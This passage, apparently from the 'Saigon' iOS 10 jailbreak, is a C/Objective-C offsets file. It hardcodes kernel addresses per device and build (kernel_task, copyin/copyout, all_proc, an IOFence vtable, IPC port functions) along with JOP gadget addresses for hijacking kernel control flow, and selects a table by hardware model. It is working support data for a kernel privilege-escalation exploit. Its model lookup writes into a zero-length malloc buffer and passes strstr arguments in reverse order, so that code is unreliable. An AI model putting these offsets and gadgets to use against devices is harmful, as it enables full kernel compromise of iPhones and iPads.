    g_offsets.panic = 0xFFFFFFF0070AABB0 - g_offsets.kernel_base; // updated
    g_offsets.quad_format_string = 0xfffffff00705d603 - g_offsets.kernel_base; // same
    g_offsets.null_terminator = 0xfffffff00705e409 - g_offsets.kernel_base; // same
}

// iPhone 6s (N71AP) - iOS 10.2.1 (14D27)
void set_n71ap_10_2_1() {
    g_offsets.kernel_base = 0xFFFFFFF00605C000; // added
    g_offsets.kernel_task = 0xFFFFFFF0075B2050 - g_offsets.kernel_base; // same
    g_offsets.realhost = 0xFFFFFFF007538A98 - g_offsets.kernel_base; // same
    g_offsets.kernel_text = 0xFFFFFFF007004000; // same
    g_offsets.l1icachesize_string = 0xfffffff00704b885 - g_offsets.kernel_base; // same
    g_offsets.osserializer_serialize = 0xFFFFFFF00744DF80 - g_offsets.kernel_base; // same
    g_offsets.kern_proc = 0xFFFFFFF0075B20E0 - g_offsets.kernel_base; // same
    g_offsets.cachesize_callback = 0xfffffff0073b1128 - g_offsets.kernel_base; // same
    g_offsets.sysctl_hw_family = 0xFFFFFFF00752A678 - g_offsets.kernel_base; // same
    g_offsets.ret_gadget = 0xFFFFFFF0070A9398 - g_offsets.kernel_base; // same
    g_offsets.iofence_vtable_offset = 0xFFFFFFF006E83B88 - g_offsets.kernel_base; // updated
    g_offsets.l1dcachesize_handler = 0xfffffff00752a628 - g_offsets.kernel_base; // same
    g_offsets.l1dcachesize_string = 0xfffffff00704b892 - g_offsets.kernel_base; // same
    g_offsets.copyin = 0xFFFFFFF007182AF0 - g_offsets.kernel_base; // same
    g_offsets.all_proc = 0xfffffff0075ac438 - g_offsets.kernel_base; // same
    g_offsets.copyout = 0xFFFFFFF007182CF8 - g_offsets.kernel_base; // same
    g_offsets.panic = 0xFFFFFFF0070AABB0 - g_offsets.kernel_base; // same
    g_offsets.quad_format_string = 0xfffffff00705d603 - g_offsets.kernel_base; // same
    g_offsets.null_terminator = 0xfffffff00705e409 - g_offsets.kernel_base; // same

    g_offsets.jop_GADGET_PROLOGUE_1       = 0xfffffff006715214 - g_offsets.kernel_base;
    g_offsets.jop_LDP_X2_X1_X1__BR_X2     = 0xfffffff006bd64a4 - g_offsets.kernel_base;
    g_offsets.jop_MOV_X23_X0__BLR_X8      = 0xfffffff007478614 - g_offsets.kernel_base;
    g_offsets.jop_GADGET_INITIALIZE_X20_1 = 0xfffffff0064ebd44 - g_offsets.kernel_base;
    g_offsets.jop_MOV_X25_X0__BLR_X8      = 0xfffffff0073bd2fc - g_offsets.kernel_base;
    g_offsets.jop_GADGET_POPULATE_1       = 0xfffffff006d6c820 - g_offsets.kernel_base;
    g_offsets.jop_MOV_X19_X9__BR_X8       = 0xfffffff0069239cc - g_offsets.kernel_base;
    g_offsets.jop_MOV_X20_X12__BR_X8      = 0xfffffff0068e9950 - g_offsets.kernel_base;
    g_offsets.jop_MOV_X21_X5__BLR_X8      = 0xfffffff0067fda78 - g_offsets.kernel_base;
    g_offsets.jop_MOV_X22_X6__BLR_X8      = 0xfffffff00689e87c - g_offsets.kernel_base;
    g_offsets.jop_MOV_X0_X3__BLR_X8       = 0xfffffff00740ebc8 - g_offsets.kernel_base;
    g_offsets.jop_MOV_X24_X4__BR_X8       = 0xfffffff0067fde74 - g_offsets.kernel_base;
    g_offsets.jop_MOV_X8_X10__BR_X11      = 0xfffffff006837c38 - g_offsets.kernel_base;
    g_offsets.jop_GADGET_CALL_FUNCTION_1  = 0xfffffff00749785c - g_offsets.kernel_base;
    g_offsets.jop_GADGET_STORE_RESULT_1   = 0xfffffff0064f9394 - g_offsets.kernel_base;
    g_offsets.jop_GADGET_EPILOGUE_1       = 0xfffffff0070806d8 - g_offsets.kernel_base;
}

// iPhone 6s (N71mAP) - iOS 10.2.1 (14D27)
void set_n71map_10_2_1() {
    g_offsets.kernel_base = 0xFFFFFFF00605C000; // same
    g_offsets.kernel_task = 0xFFFFFFF0075B2050 - g_offsets.kernel_base; // same
    g_offsets.realhost = 0xFFFFFFF007538A98 - g_offsets.kernel_base; // same
    g_offsets.kernel_text = 0xFFFFFFF007004000; // same
    g_offsets.l1icachesize_string = 0xfffffff00704b885 - g_offsets.kernel_base; // same
    g_offsets.osserializer_serialize = 0xFFFFFFF00744DF80 - g_offsets.kernel_base; // same
    g_offsets.kern_proc = 0xFFFFFFF0075B20E0 - g_offsets.kernel_base; // same
    g_offsets.cachesize_callback = 0xfffffff0073b1128 - g_offsets.kernel_base; // same
    g_offsets.sysctl_hw_family = 0xFFFFFFF00752A678 - g_offsets.kernel_base; // same
    g_offsets.ret_gadget = 0xFFFFFFF0070A9398 - g_offsets.kernel_base; // same
    g_offsets.iofence_vtable_offset = 0xFFFFFFF006E83B88 - g_offsets.kernel_base; // same
    g_offsets.l1dcachesize_handler = 0xfffffff00752a628 - g_offsets.kernel_base; // same
    g_offsets.l1dcachesize_string = 0xfffffff00704b892 - g_offsets.kernel_base; // same
    g_offsets.copyin = 0xFFFFFFF007182AF0 - g_offsets.kernel_base; // same
    g_offsets.all_proc = 0xfffffff0075ac438 - g_offsets.kernel_base; // same
    g_offsets.copyout = 0xFFFFFFF007182CF8 - g_offsets.kernel_base; // same
    g_offsets.panic = 0xFFFFFFF0070AABB0 - g_offsets.kernel_base; // same
    g_offsets.quad_format_string = 0xfffffff00705d603 - g_offsets.kernel_base; // same
    g_offsets.null_terminator = 0xfffffff00705e409 - g_offsets.kernel_base; // same
}

// iPhone 6s Plus (N66AP) - iOS 10.2.1 (14D27)
void set_n66ap_10_2_1() {
    g_offsets.kernel_base = 0xFFFFFFF00605C000; // same
    g_offsets.kernel_task = 0xFFFFFFF0075B2050 - g_offsets.kernel_base; // same
    g_offsets.realhost = 0xFFFFFFF007538A98 - g_offsets.kernel_base; // same
    g_offsets.kernel_text = 0xFFFFFFF007004000; // same
    g_offsets.l1icachesize_string = 0xfffffff00704b885 - g_offsets.kernel_base; // same
    g_offsets.osserializer_serialize = 0xFFFFFFF00744DF80 - g_offsets.kernel_base; // same
    g_offsets.kern_proc = 0xFFFFFFF0075B20E0 - g_offsets.kernel_base; // same
    g_offsets.cachesize_callback = 0xfffffff0073b1128 - g_offsets.kernel_base; // same
    g_offsets.sysctl_hw_family = 0xFFFFFFF00752A678 - g_offsets.kernel_base; // same
    g_offsets.ret_gadget = 0xFFFFFFF0070A9398 - g_offsets.kernel_base; // same
    g_offsets.iofence_vtable_offset = 0xFFFFFFF006E83B88 - g_offsets.kernel_base; // same
    g_offsets.l1dcachesize_handler = 0xfffffff00752a628 - g_offsets.kernel_base; // same
    g_offsets.l1dcachesize_string = 0xfffffff00704b892 - g_offsets.kernel_base; // same
    g_offsets.copyin = 0xFFFFFFF007182AF0 - g_offsets.kernel_base; // same
    g_offsets.all_proc = 0xfffffff0075ac438 - g_offsets.kernel_base; // same
    g_offsets.copyout = 0xFFFFFFF007182CF8 - g_offsets.kernel_base; // same
    g_offsets.panic = 0xFFFFFFF0070AABB0 - g_offsets.kernel_base; // same
    g_offsets.quad_format_string = 0xfffffff00705d603 - g_offsets.kernel_base; // same
    g_offsets.null_terminator = 0xfffffff00705e409 - g_offsets.kernel_base; // same
}

// iPhone 6s Plus (N66mAP) - iOS 10.2.1 (14D27)
void set_n66map_10_2_1() {
    g_offsets.kernel_base = 0xFFFFFFF00605C000; // same
    g_offsets.kernel_task = 0xFFFFFFF0075B2050 - g_offsets.kernel_base; // same
    g_offsets.realhost = 0xFFFFFFF007538A98 - g_offsets.kernel_base; // same
    g_offsets.kernel_text = 0xFFFFFFF007004000; // same
    g_offsets.l1icachesize_string = 0xfffffff00704b885 - g_offsets.kernel_base; // same
    g_offsets.osserializer_serialize = 0xFFFFFFF00744DF80 - g_offsets.kernel_base; // same
    g_offsets.kern_proc = 0xFFFFFFF0075B20E0 - g_offsets.kernel_base; // same
    g_offsets.cachesize_callback = 0xfffffff0073b1128 - g_offsets.kernel_base; // same
    g_offsets.sysctl_hw_family = 0xFFFFFFF00752A678 - g_offsets.kernel_base; // same
    g_offsets.ret_gadget = 0xFFFFFFF0070A9398 - g_offsets.kernel_base; // same
    g_offsets.iofence_vtable_offset = 0xFFFFFFF006E83B88 - g_offsets.kernel_base; // same
    g_offsets.l1dcachesize_handler = 0xfffffff00752a628 - g_offsets.kernel_base; // same
    g_offsets.l1dcachesize_string = 0xfffffff00704b892 - g_offsets.kernel_base; // same
    g_offsets.copyin = 0xFFFFFFF007182AF0 - g_offsets.kernel_base; // same
    g_offsets.all_proc = 0xfffffff0075ac438 - g_offsets.kernel_base; // same
    g_offsets.copyout = 0xFFFFFFF007182CF8 - g_offsets.kernel_base; // same
    g_offsets.panic = 0xFFFFFFF0070AABB0 - g_offsets.kernel_base; // same
    g_offsets.quad_format_string = 0xfffffff00705d603 - g_offsets.kernel_base; // same
    g_offsets.null_terminator = 0xfffffff00705e409 - g_offsets.kernel_base; // same
}

// iPad Mini 4 (J96AP) - iOS 10.2.1 (14D27)
void set_j96ap_10_2_1() {
    g_offsets.kernel_base = 0xFFFFFFF006068000; // updated
    g_offsets.kernel_task = 0xfffffff0075c2050 - g_offsets.kernel_base; // same
    g_offsets.realhost = 0xfffffff007548a98 - g_offsets.kernel_base; // same
    g_offsets.kernel_text = 0xFFFFFFF007004000; // same
    g_offsets.l1icachesize_string = 0xfffffff007057883 - g_offsets.kernel_base; // same
    g_offsets.osserializer_serialize = 0xfffffff00745b100 - g_offsets.kernel_base; // same
    g_offsets.kern_proc = 0xfffffff0075c20e0 - g_offsets.kernel_base; // same
    g_offsets.cachesize_callback = 0xfffffff0073be2a8 - g_offsets.kernel_base; // same
    g_offsets.sysctl_hw_family = 0xfffffff00753a678 - g_offsets.kernel_base; // same
    g_offsets.ret_gadget = 0xFFFFFFF0070B55B8 - g_offsets.kernel_base; // same
    g_offsets.iofence_vtable_offset = 0xFFFFFFF006ED8748 - g_offsets.kernel_base; // updated
    g_offsets.l1dcachesize_handler = 0xfffffff00753a628 - g_offsets.kernel_base; // same
    g_offsets.l1dcachesize_string = 0xfffffff007057890 - g_offsets.kernel_base; // same
    g_offsets.copyin = 0xFFFFFFF00718F76C - g_offsets.kernel_base; // same
    g_offsets.all_proc = 0xfffffff0075bc468 - g_offsets.kernel_base; // same
    g_offsets.copyout = 0xfffffff00718f974 - g_offsets.kernel_base; // same
    g_offsets.panic = 0xfffffff0070b6dd0 - g_offsets.kernel_base; // same
    g_offsets.quad_format_string = 0xfffffff007069601 - g_offsets.kernel_base; // same
    g_offsets.null_terminator = 0xfffffff00706a407 - g_offsets.kernel_base; // same
    
}

// iPad Mini 4 (J97AP) - iOS 10.2.1 (14D27)
void set_j97ap_10_2_1() {
    g_offsets.kernel_base = 0xFFFFFFF006068000; // same
    g_offsets.kernel_task = 0xfffffff0075c2050 - g_offsets.kernel_base; // same
    g_offsets.realhost = 0xfffffff007548a98 - g_offsets.kernel_base; // same
    g_offsets.kernel_text = 0xFFFFFFF007004000; // same
    g_offsets.l1icachesize_string = 0xfffffff007057883 - g_offsets.kernel_base; // same
    g_offsets.osserializer_serialize = 0xfffffff00745b100 - g_offsets.kernel_base; // same
    g_offsets.kern_proc = 0xfffffff0075c20e0 - g_offsets.kernel_base; // same
    g_offsets.cachesize_callback = 0xfffffff0073be2a8 - g_offsets.kernel_base; // same
    g_offsets.sysctl_hw_family = 0xfffffff00753a678 - g_offsets.kernel_base; // same
    g_offsets.ret_gadget = 0xFFFFFFF0070B55B8 - g_offsets.kernel_base; // same
    g_offsets.iofence_vtable_offset = 0xFFFFFFF006ED8748 - g_offsets.kernel_base; // same
    g_offsets.l1dcachesize_handler = 0xfffffff00753a628 - g_offsets.kernel_base; // same
    g_offsets.l1dcachesize_string = 0xfffffff007057890 - g_offsets.kernel_base; // same
    g_offsets.copyin = 0xFFFFFFF00718F76C - g_offsets.kernel_base; // same
    g_offsets.all_proc = 0xfffffff0075bc468 - g_offsets.kernel_base; // same
    g_offsets.copyout = 0xfffffff00718f974 - g_offsets.kernel_base; // same
    g_offsets.panic = 0xfffffff0070b6dd0 - g_offsets.kernel_base; // same
    g_offsets.quad_format_string = 0xfffffff007069601 - g_offsets.kernel_base; // same
    g_offsets.null_terminator = 0xfffffff00706a407 - g_offsets.kernel_base; // same
    
}

// iPad Air 2 (J81AP) - iOS 10.2.1 (14D27)
void set_j81ap_10_2_1() {
    g_offsets.kernel_base = 0xFFFFFFF006070000; // updated
    g_offsets.kernel_task = 0xFFFFFFF0075C2050 - g_offsets.kernel_base; // updated
    g_offsets.realhost = 0xFFFFFFF007548A98 - g_offsets.kernel_base; // updated !!!
    g_offsets.kernel_text = 0xFFFFFFF007004000; // same
    g_offsets.l1icachesize_string = 0xfffffff007057883 - g_offsets.kernel_base; // updated
    g_offsets.osserializer_serialize = 0xfffffff00745b324 - g_offsets.kernel_base; // updated
    g_offsets.kern_proc = 0xFFFFFFF0075C20E0 - g_offsets.kernel_base; // updated
    g_offsets.cachesize_callback = 0xfffffff0073be4cc - g_offsets.kernel_base; // updated
    g_offsets.sysctl_hw_family = 0xfffffff00753a678 - g_offsets.kernel_base; // same
    g_offsets.ret_gadget = 0xFFFFFFF0070B55B8 - g_offsets.kernel_base; // updated
    g_offsets.iofence_vtable_offset = 0xfffffff006ed8748 - g_offsets.kernel_base; // updated
    g_offsets.l1dcachesize_handler = 0xfffffff00753a628 - g_offsets.kernel_base; // same
    g_offsets.l1dcachesize_string = 0xfffffff007057890 - g_offsets.kernel_base; // updated
    g_offsets.copyin = 0xfffffff00718f864 - g_offsets.kernel_base; // updated
    g_offsets.all_proc = 0xfffffff0075bc528 - g_offsets.kernel_base; // updated
    g_offsets.copyout = 0xfffffff00718fa6c - g_offsets.kernel_base; // updated
    g_offsets.panic = 0xfffffff0070b6dd0 - g_offsets.kernel_base; // updated
    g_offsets.quad_format_string = 0xfffffff007069601 - g_offsets.kernel_base; // updated
    g_offsets.null_terminator = 0xfffffff00706a407 - g_offsets.kernel_base; // updated
}

// iPad Air 2 (J82AP) - iOS 10.2.1 (14D27)
void set_j82ap_10_2_1() {
    g_offsets.kernel_base = 0xFFFFFFF006070000; // updated
    g_offsets.kernel_task = 0xFFFFFFF0075C2050 - g_offsets.kernel_base; // updated
    g_offsets.realhost = 0xFFFFFFF007548A98 - g_offsets.kernel_base; // updated

    g_offsets.l1icachesize_string = 0xfffffff007057883 - g_offsets.kernel_base; // updated
    g_offsets.osserializer_serialize = 0xfffffff00745b324 - g_offsets.kernel_base; // updated
    g_offsets.kern_proc = 0xFFFFFFF0075C20E0 - g_offsets.kernel_base; // updated
    g_offsets.cachesize_callback = 0xfffffff0073be4cc - g_offsets.kernel_base; // updated
    g_offsets.sysctl_hw_family = 0xfffffff00753a678 - g_offsets.kernel_base; // same
    g_offsets.ret_gadget = 0xFFFFFFF0070B55B8 - g_offsets.kernel_base; // updated
    g_offsets.iofence_vtable_offset = 0xfffffff006ed8748 - g_offsets.kernel_base; // updated
    g_offsets.l1dcachesize_handler = 0xfffffff00753a628 - g_offsets.kernel_base; // same
    g_offsets.l1dcachesize_string = 0xfffffff007057890 - g_offsets.kernel_base; // updated
    g_offsets.copyin = 0xfffffff00718f864 - g_offsets.kernel_base; // updated
    g_offsets.all_proc = 0xfffffff0075bc528 - g_offsets.kernel_base; // updated
    g_offsets.copyout = 0xfffffff00718fa6c - g_offsets.kernel_base; // updated
    g_offsets.panic = 0xfffffff0070b6dd0 - g_offsets.kernel_base; // updated
    g_offsets.quad_format_string = 0xfffffff007069601 - g_offsets.kernel_base; // updated
    g_offsets.null_terminator = 0xfffffff00706a407 - g_offsets.kernel_base; // updated
}


// iPhone 6 (N61AP) - iOS 10.3.1 (14E304)
void set_n61ap_10_3_1() {
    
    g_offsets.kernel_base = 0xFFFFFFF00609C000; // updated
    g_offsets.kernel_task = 0xfffffff0075b4048 - g_offsets.kernel_base;
    g_offsets.realhost = 0xfffffff00753ABA0 - g_offsets.kernel_base;
    g_offsets.kernel_text = 0xFFFFFFF007004000; // same
    g_offsets.l1icachesize_string = 0xfffffff007057a83 - g_offsets.kernel_base; // same
    g_offsets.osserializer_serialize = 0xfffffff00744d6ac - g_offsets.kernel_base; // same
    g_offsets.kern_proc = 0xfffffff0075b40c8 - g_offsets.kernel_base; // same
    g_offsets.cachesize_callback = 0xFFFFFFF0073B3B04 - g_offsets.kernel_base; // updated
    g_offsets.sysctl_hw_family = 0xfffffff00752a320 - g_offsets.kernel_base; // same
    g_offsets.ret_gadget = 0xFFFFFFF0070B5428 - g_offsets.kernel_base; // updated
    g_offsets.iofence_vtable_offset = 0xFFFFFFF006EED520 - g_offsets.kernel_base; // updated
    g_offsets.l1dcachesize_handler = 0xfffffff00752a280 - g_offsets.kernel_base; // THIS IS ACTUALLY l1icachesize handler???!?!?
    g_offsets.l1dcachesize_string = 0xfffffff007057a90 - g_offsets.kernel_base; // same
    g_offsets.copyin = 0xfffffff00718d3a8 - g_offsets.kernel_base; // same
    g_offsets.all_proc = 0xfffffff0075ae6e0 - g_offsets.kernel_base; // same
    g_offsets.copyout = 0xfffffff00718d59c - g_offsets.kernel_base; // same
    g_offsets.panic = 0xfffffff0070b69b8 - g_offsets.kernel_base; // same
    g_offsets.quad_format_string = 0xfffffff007069de1 - g_offsets.kernel_base; // same
    g_offsets.null_terminator = 0xfffffff00706a40f - g_offsets.kernel_base; // same
    

    // JOP staff
    g_offsets.jop_GADGET_PROLOGUE_2                = 0xfffffff006719200 - g_offsets.kernel_base;
    g_offsets.jop_LDP_X2_X1_X1__BR_X2              = 0xfffffff006b5d8cc - g_offsets.kernel_base;
    g_offsets.jop_MOV_X23_X0__BLR_X8               = 0xfffffff006426efc - g_offsets.kernel_base;
    g_offsets.jop_GADGET_INITIALIZE_X20_1          = 0xfffffff00662bd28 - g_offsets.kernel_base;
    g_offsets.jop_MOV_X25_X19__BLR_X8              = 0xfffffff006a086ac - g_offsets.kernel_base;
    g_offsets.jop_GADGET_POPULATE_2                = 0xfffffff006d3ef20 - g_offsets.kernel_base;
    g_offsets.jop_MOV_X19_X5__BLR_X8               = 0xfffffff0074a98c4 - g_offsets.kernel_base;
    g_offsets.jop_MOV_X20_X19__BR_X8               = 0xfffffff0068345ac - g_offsets.kernel_base;
    g_offsets.jop_MOV_X5_X6__BLR_X8                = 0xfffffff0066392a8 - g_offsets.kernel_base;
    g_offsets.jop_MOV_X21_X11__BLR_X8              = 0xfffffff00749e324 - g_offsets.kernel_base;
    g_offsets.jop_MOV_X22_X9__BLR_X8               = 0xfffffff0064399bc - g_offsets.kernel_base;
    g_offsets.jop_MOV_X0_X3__BLR_X8                = 0xfffffff00721e278 - g_offsets.kernel_base;
    g_offsets.jop_MOV_X24_X4__BR_X8                = 0xfffffff0069dc86c - g_offsets.kernel_base;
    g_offsets.jop_MOV_X8_X10__BR_X12               = 0xfffffff006960b94 - g_offsets.kernel_base;
    g_offsets.jop_MOV_X19_X9__BR_X8                = 0xfffffff0069439d4 - g_offsets.kernel_base;
    g_offsets.jop_GADGET_CALL_FUNCTION_1           = 0xfffffff007495520 - g_offsets.kernel_base;
    g_offsets.jop_GADGET_STORE_RESULT_1            = 0xfffffff00683e910 - g_offsets.kernel_base;
    g_offsets.jop_GADGET_EPILOGUE_2                = 0xfffffff0070a9ebc - g_offsets.kernel_base;


    // 10.3.x offsets
    g_offsets.kernel_map = 0xFFFFFFF0075B4050 - g_offsets.kernel_base; // added
    g_offsets.zone_map = 0xFFFFFFF007558478 - g_offsets.kernel_base;
    g_offsets.mach_vm_remap = 0xFFFFFFF007164620 - g_offsets.kernel_base; // added
    g_offsets.ipc_port_make_send = 0xFFFFFFF0070A5C40 - g_offsets.kernel_base; // added
    g_offsets.ipc_port_alloc_special = 0xFFFFFFF0070A611C - g_offsets.kernel_base; // added
    g_offsets.ipc_space_kernel = 0xFFFFFFF007539408 - g_offsets.kernel_base; // added
    g_offsets.ipc_kobject_set = 0xFFFFFFF0070B9374 - g_offsets.kernel_base; // added
    g_offsets.mach_vm_wire = 0xFFFFFFF007165078 - g_offsets.kernel_base; // added
    
    g_offsets.iosurface_kernel_object_size = 0x350;
}


// iPhone 6s (N71AP) - iOS 10.3.1 (14E304)
void set_n71ap_10_3_1() {
    g_offsets.kernel_base = 0xfffffff00601c000; // same
    g_offsets.kernel_task = 0xFFFFFFF0075A4048 - g_offsets.kernel_base; // added
    g_offsets.realhost = 0xFFFFFFF00752ABA0 - g_offsets.kernel_base; // added
    g_offsets.kernel_text = 0xFFFFFFF007004000; // added
    g_offsets.l1icachesize_string = 0xfffffff00704ba85 - g_offsets.kernel_base; // same
    g_offsets.osserializer_serialize = 0xfffffff00744053c - g_offsets.kernel_base; // same
    g_offsets.kern_proc = 0xfffffff0075a40c8 - g_offsets.kernel_base; // same
    g_offsets.cachesize_callback = 0xFFFFFFF0073A6994 - g_offsets.kernel_base; // updated
    g_offsets.sysctl_hw_family = 0xFFFFFFF00751A280 - g_offsets.kernel_base; // updated
    g_offsets.ret_gadget = 0xFFFFFFF0070A9208 - g_offsets.kernel_base; // updated
    g_offsets.iofence_vtable_offset = 0xfffffff006e7bd60 - g_offsets.kernel_base; // same
    g_offsets.l1dcachesize_handler = 0xFFFFFFF00751A2D0 - g_offsets.kernel_base; // updated
    g_offsets.l1dcachesize_string = 0xfffffff00704ba92 - g_offsets.kernel_base; // same
    g_offsets.copyin = 0xfffffff007180720 - g_offsets.kernel_base; // same
    g_offsets.all_proc = 0xfffffff00759e6c0 - g_offsets.kernel_base; // same
    g_offsets.copyout = 0xfffffff007180914 - g_offsets.kernel_base; // same
    g_offsets.panic = 0xfffffff0070aa798 - g_offsets.kernel_base; // same
    g_offsets.quad_format_string = 0xfffffff00705dde3 - g_offsets.kernel_base; // same
    g_offsets.null_terminator = 0xfffffff00705e411 - g_offsets.kernel_base; // same
    
    // 10.3.x offsets
    g_offsets.kernel_map = 0xFFFFFFF0075A4050 - g_offsets.kernel_base; // added
}

/*
 * Function name: 	offsets_get_os_build_version
 * Description:		Gets a string with the OS's build version.
 * Returns:			kern_return_t and os build version in output param.
 */

static
kern_return_t offsets_get_os_build_version(char * os_build_version) {
    
    kern_return_t ret = KERN_SUCCESS;
    int mib[2] = {CTL_KERN, KERN_OSVERSION};
    uint32_t namelen = sizeof(mib) / sizeof(mib[0]);
    size_t buffer_size = 0;
    char * errno_str = NULL;
    
    ret = sysctl(mib, namelen, NULL, &buffer_size, NULL, 0);
    
    if (KERN_SUCCESS != ret)
    {
        errno_str = strerror(errno);
        printf("[ERROR]: getting OS version's buffer size: %s", errno_str);
        goto cleanup;
    }
    
    ret = sysctl(mib, namelen, os_build_version, &buffer_size, NULL, 0);
    if (KERN_SUCCESS != ret)
    {
        errno_str = strerror(errno);
        printf("[ERROR]: getting OS version: %s", errno_str);
        goto cleanup;
    }
    
cleanup:
    return ret;
}

/*
 * Function name: 	offsets_get_device_type_and_version
 * Description:		Gets the device type and version.
 * Returns:			kern_return_t and data in output params.
 */

static
kern_return_t offsets_get_device_type_and_version(char * machine, char * build) {
    
    kern_return_t ret = KERN_SUCCESS;
    struct utsname u;
    char os_build_version[0x100] = {0};
    
    memset(&u, 0, sizeof(u));
    
    ret = uname(&u);
    if (ret)
    {
        printf("[ERROR]: uname-ing");
        goto cleanup;
    }
    
    ret = offsets_get_os_build_version(os_build_version);
    if (KERN_SUCCESS != ret) {
        printf("[ERROR]: getting OS Build version!");
        goto cleanup;
    }
    
    strcpy(machine, u.machine);
    strcpy(build, os_build_version);
    
cleanup:
    return ret;
}


/*
 * Function name: 	offsets_determine_initializer_for_device_and_build
 * Description:		Determines which function should be used as an initializer for the device and build given.
 * Returns:			kern_return_t.
 */

static
kern_return_t offsets_determine_initializer_for_device_and_build(char * device, char * build) {
    
    kern_return_t ret = KERN_SUCCESS;
    
    struct utsname u = { 0 };
    uname(&u);
    
    printf("[INFO]: sysname: %s\n", u.sysname);
    printf("[INFO]: nodename: %s\n", u.nodename);
    printf("[INFO]: release: %s\n", u.release);
    printf("[INFO]: kernel version: %s\n", u.version);
    printf("[INFO]: machine: %s\n", u.machine);
    printf("[INFO]: build: %s\n", build);

    init_default();
    
    size_t len = 0;
    char *model = malloc(len * sizeof(char));
    sysctlbyname("hw.model", NULL, &len, NULL, 0);
    if (len) {
        sysctlbyname("hw.model", model, &len, NULL, 0);
        printf("[INFO]: model internal name: %s\n", model);
    }

    // detect offsets
    if(strstr("14C92", build)) {
        
        if(strstr("J72AP", model)) { // iPad Air 1 - J72AP
            
            printf("[INFO]: iPad Air 1 (J72AP) running iOS 10.2\n");
            set_j71ap_10_2();
            
        } else {
            printf("[ERROR]: iOS version supported but device is not\n");
            ret = KERN_FAILURE;
        }
        
    } else if(strstr("14D27", build)) {

        if(strstr("N102AP", model)) { // iPod Touch 6 - N102AP
            
            printf("[INFO]: iPod Touch 6 (N102AP) running iOS 10.2.1\n");
            set_n102ap_10_2_1();
            
        } else if(strstr("N69AP", model)) { // iPhone SE - N69AP
            
            printf("[INFO]: iPhone SE (N69AP) running iOS 10.2.1\n");
            set_n69ap_10_2_1();
        
        } else if(strstr("N69uAP", model)) { // iPhone SE - N69uAP
            
            printf("[INFO]: iPhone SE (N69uAP) running iOS 10.2.1 (Not tested)\n");
            set_n69uap_10_2_1();
            
            
        } else if(strstr("N61AP", model)) { // iPhone 6 - N61AP
            
            printf("[INFO]: iPhone 6 running iOS 10.2.1\n");
            set_n61ap_10_2_1();
            
            
        } else if(strstr("N56AP", model)) { // iPhone 6 Plus - N56AP
            
            printf("[INFO]: iPhone 6 Plus running iOS 10.2.1\n");
            set_n56ap_10_2_1();
            
            
        } else if(strstr("N71AP", model)) { // iPhone 6s - N71AP
            
            printf("[INFO]: iPhone 6s (N71AP) running iOS 10.2.1\n");
            set_n71ap_10_2_1();
            
            
        } else if(strstr("N71mAP", model)) {  // iPhone 6s - N71mAP
           
            printf("[INFO]: iPhone 6s (N71mAP) running iOS 10.2.1\n");
            set_n71map_10_2_1();
            
            
        } else if(strstr("N66AP", model)) {  // iPhone 6s Plus - N66AP
            
            printf("[INFO]: iPhone 6s Plus (N66AP) running iOS 10.2.1\n");
            set_n66ap_10_2_1();
            
            
        } else if(strstr("N66mAP", model)) {  // iPhone 6s Plus - N66mAP
            
            printf("[INFO]: iPhone 6s Plus (N66mAP) running iOS 10.2.1\n");
            set_n66map_10_2_1();
            
            
        } else if(strstr("D101AP", model)) {  // iPhone 7 - D101AP
            
            printf("[INFO]: iPhone 7 (D101AP) running iOS 10.2.1\n");
//            set_d101ap_10_2_1();
            
            
        } else if(strstr("J96AP", model)) {  // iPad Mini 4 - J96AP
            
            printf("[INFO]: iPad Mini 4 (J96AP) running iOS 10.2.1\n");
            set_j96ap_10_2_1();
            
            
        } else if(strstr("J97AP", model)) {  // iPad Mini 4 - J97AP
            
            printf("[INFO]: iPad Mini 4 (J97AP) running iOS 10.2.1\n");
            set_j97ap_10_2_1();
            
            
        } else if(strstr("J81AP", model)) {  // iPad Air 2 - J81AP
            
            printf("[INFO]: iPad Air 2 (J81AP) running iOS 10.2.1\n");
            set_j81ap_10_2_1();
            
            
        } else if(strstr("J82AP", model)) {  // iPad Air 2 - J82AP
            
            printf("[INFO]: iPad Air 2 (J82AP) running iOS 10.2.1\n");
            set_j82ap_10_2_1();
            
            
        } else {
            
            printf("[ERROR]: iOS version supported but device is not\n");
            ret = KERN_FAILURE;
        }


    } else if(strstr("14E304", build)) {
        
        if(strstr("N61AP", model)) { // iPhone 6 - N61AP
            
            NSLog(@"[SAIGON]: iPhone 6 running iOS 10.3.1 -- not tested!\n");
            set_n61ap_10_3_1();

            
        } else if(strstr("N71AP", model)) { // iPhone 6s - N71AP
            
            printf("[INFO]: iPhone 6s (N71AP) running iOS 10.3.1 -- Not Tested\n");
//            set_n71ap_10_3_1();
            ret = KERN_FAILURE;
            
        }
        
        
    } else {
        
        printf("[ERROR]: iOS version not supported\n");
        ret = KERN_FAILURE;
    }
    
    
cleanup:
    return ret;
}


/*
 * Function name: 	offsets_init
 * Description:		Initializes offsets for the current build running.
 * Returns:			kern_return_t.
 */

kern_return_t offsets_init() {

    kern_return_t ret = KERN_SUCCESS;
    
    char machine[0x100] = {0};
    char build[0x100] = {0};
    
    memset(&g_offsets, 0, sizeof(g_offsets));

    ret = offsets_get_device_type_and_version(machine, build);
    if (KERN_SUCCESS != ret)
    {
        printf("[ERROR]: getting device type and build version");
        goto cleanup;
    }
    
    printf("[*] Welcome to Saigon\n");
    printf("[INFO]: machine: %s\n", machine);
    printf("[INFO]: build: %s\n", build);
    
    
    NSString *version = [[UIDevice currentDevice] systemVersion];
    printf("[INFO]: version: %s\n", [version UTF8String]);
    
    ret = offsets_determine_initializer_for_device_and_build(machine, build);
    if (KERN_SUCCESS != ret)
        goto cleanup;

cleanup:
    return ret;
}
